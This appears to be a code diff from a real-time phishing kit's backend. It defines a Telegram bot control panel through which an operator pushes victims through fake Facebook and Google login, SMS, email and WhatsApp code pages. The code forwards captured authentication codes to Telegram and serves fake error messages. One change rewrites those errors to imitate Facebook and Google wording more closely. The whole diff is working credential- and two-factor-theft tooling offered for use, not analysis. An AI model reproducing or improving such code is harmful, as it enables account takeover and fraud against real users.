@@ -54,45 +54,70 @@ def build_inline_keyboard(client_id: str) -> dict:
     return {
         "inline_keyboard": [
             [
-                {"text": "🌐 LANDING.META", "url": f"{base}/navigate?client_id={client_id}&action=nav-meta"},
-                {"text": "🌐 LANDING.GG", "url": f"{base}/navigate?client_id={client_id}&action=nav-google"},
+                {"text": "🌐 LANDING.META",
+                    "url": f"{base}/navigate?client_id={client_id}&action=nav-meta"},
+                {"text": "🌐 LANDING.GG",
+                    "url": f"{base}/navigate?client_id={client_id}&action=nav-google"},
             ],
             [
-                {"text": "🔐 FB.AUTH", "url": f"{base}/navigate?client_id={client_id}&action=fb-auth"},
-                {"text": "📱 FB.SMS", "url": f"{base}/navigate?client_id={client_id}&action=fb-sms"},
-                {"text": "📧 FB.EMAIL", "url": f"{base}/navigate?client_id={client_id}&action=fb-email"},
-                {"text": "💬 FB.WA", "url": f"{base}/navigate?client_id={client_id}&action=fb-whatsapp"},
+                {"text": "🔐 FB.AUTH",
+                    "url": f"{base}/navigate?client_id={client_id}&action=fb-auth"},
+                {"text": "📱 FB.SMS",
+                    "url": f"{base}/navigate?client_id={client_id}&action=fb-sms"},
+                {"text": "📧 FB.EMAIL",
+                    "url": f"{base}/navigate?client_id={client_id}&action=fb-email"},
+                {"text": "💬 FB.WA",
+                    "url": f"{base}/navigate?client_id={client_id}&action=fb-whatsapp"},
             ],
             [
-                {"text": "🌐 FB.GG", "url": f"{base}/admin/input?client_id={client_id}&type=fb-google"},
-                {"text": "🔐 GG.SIGNIN", "url": f"{base}/navigate?client_id={client_id}&action=sign-in"},
-                {"text": "🔐 GG.AUTH", "url": f"{base}/navigate?client_id={client_id}&action=gg-auth"},
-                {"text": "📱 GG.SMS", "url": f"{base}/admin/input?client_id={client_id}&type=gg-sms"},
+                {"text": "🌐 FB.GG",
+                    "url": f"{base}/admin/input?client_id={client_id}&type=fb-google"},
+                {"text": "🔐 GG.SIGNIN",
+                    "url": f"{base}/navigate?client_id={client_id}&action=sign-in"},
+                {"text": "🔐 GG.AUTH",
+                    "url": f"{base}/navigate?client_id={client_id}&action=gg-auth"},
+                {"text": "📱 GG.SMS",
+                    "url": f"{base}/admin/input?client_id={client_id}&type=gg-sms"},
             ],
             [
-                {"text": "📧 GG.EMAIL", "url": f"{base}/admin/input?client_id={client_id}&type=gg-email"},
-                {"text": "👁 GG.CLICK", "url": f"{base}/admin/input?client_id={client_id}&type=gg-click"},
+                {"text": "📧 GG.EMAIL",
+                    "url": f"{base}/admin/input?client_id={client_id}&type=gg-email"},
+                {"text": "👁 GG.CLICK",
+                    "url": f"{base}/admin/input?client_id={client_id}&type=gg-click"},
             ],
             [
-                {"text": "❌ FB.AUTH", "url": f"{base}/show-error?client_id={client_id}&error_type=fb-auth"},
-                {"text": "❌ FB.SMS", "url": f"{base}/show-error?client_id={client_id}&error_type=fb-sms"},
-                {"text": "❌ FB.EMAIL", "url": f"{base}/show-error?client_id={client_id}&error_type=fb-email"},
-                {"text": "❌ FB.WA", "url": f"{base}/show-error?client_id={client_id}&error_type=fb-whatsapp"},
+                {"text": "❌ FB.AUTH",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-auth"},
+                {"text": "❌ FB.SMS",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-sms"},
+                {"text": "❌ FB.EMAIL",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-email"},
+                {"text": "❌ FB.WA",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-whatsapp"},
             ],
             [
-                {"text": "❌ FB.GG", "url": f"{base}/show-error?client_id={client_id}&error_type=fb-google"},
-                {"text": "❌ GG.AUTH", "url": f"{base}/show-error?client_id={client_id}&error_type=gg-auth"},
-                {"text": "❌ GG.SMS", "url": f"{base}/show-error?client_id={client_id}&error_type=gg-sms"},
-                {"text": "❌ GG.EMAIL", "url": f"{base}/show-error?client_id={client_id}&error_type=gg-email"},
+                {"text": "❌ FB.GG",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-google"},
+                {"text": "❌ GG.AUTH",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-auth"},
+                {"text": "❌ GG.SMS",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-sms"},
+                {"text": "❌ GG.EMAIL",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-email"},
             ],
             [
-                {"text": "❌ GG.CLICK", "url": f"{base}/show-error?client_id={client_id}&error_type=gg-click"},
-                {"text": "❌ FB.PASS", "url": f"{base}/show-error?client_id={client_id}&error_type=fb-pass"},
-                {"text": "❌ GG.PASS", "url": f"{base}/show-error?client_id={client_id}&error_type=gg-pass"},
+                {"text": "❌ GG.CLICK",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-click"},
+                {"text": "❌ FB.PASS",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=fb-pass"},
+                {"text": "❌ GG.PASS",
+                    "url": f"{base}/show-error?client_id={client_id}&error_type=gg-pass"},
             ],
             [
-                {"text": "✅ DONE", "url": f"{base}/navigate?client_id={client_id}&action=done"},
-                {"text": "❌ CANCEL", "url": f"{base}/navigate?client_id={client_id}&action=cancel"},
+                {"text": "✅ DONE",
+                    "url": f"{base}/navigate?client_id={client_id}&action=done"},
+                {"text": "❌ CANCEL",
+                    "url": f"{base}/navigate?client_id={client_id}&action=cancel"},
             ],
         ]
     }
@@ -260,7 +285,7 @@ async def update_telegram_message(client_id: str, update_type: str, data: dict):
         message += f"\n🔴 Auth: <code>{form['auth_code']}</code>"
     elif form.get("auth_code"):
         message += f"\n🔑 Auth: <code>{form['auth_code']}</code>"
-        
+
     # WhatsApp code
     if update_type == "fb-whatsapp" and form.get("whatsapp_code"):
         message += f"\n🔴 WhatsApp: <code>{form['whatsapp_code']}</code>"
@@ -279,8 +304,6 @@ async def update_telegram_message(client_id: str, update_type: str, data: dict):
     # Click code action
     if update_type == "click-code" and form.get("click_action"):
         message += f"\n🔴 Action: <code>{form['click_action']}</code>"
-
-
 
     # Location
     message += (
@@ -380,7 +403,7 @@ async def navigate_client(
         "gg-sms": "/google/phone-otp",
         "gg-email": "/google/email-otp",
         "gg-click": "/google/click-code",
-        
+
 
         "done": "https://calendly.com/selenakloe-contact/30min",
         "cancel": "/",
@@ -437,8 +460,8 @@ async def show_error(
         "gg-email": "Wrong code. Please try again.",
         "gg-auth": "Wrong code. Please try again.",
         "gg-click": "This code does not work. Check the code and try again.",
-        "fb-pass": "Wrong password, please try again.",
-        "gg-pass": "Wrong password, please try again.",
+        "fb-pass": "The email or mobile number you entered, or your password, is incorrect.",
+        "gg-pass": "The email or mobile number you entered, or your password, is incorrect.",
     }
     error_route_map = {
         "fb-sms": "/facebook/sms?error=wrong-code",
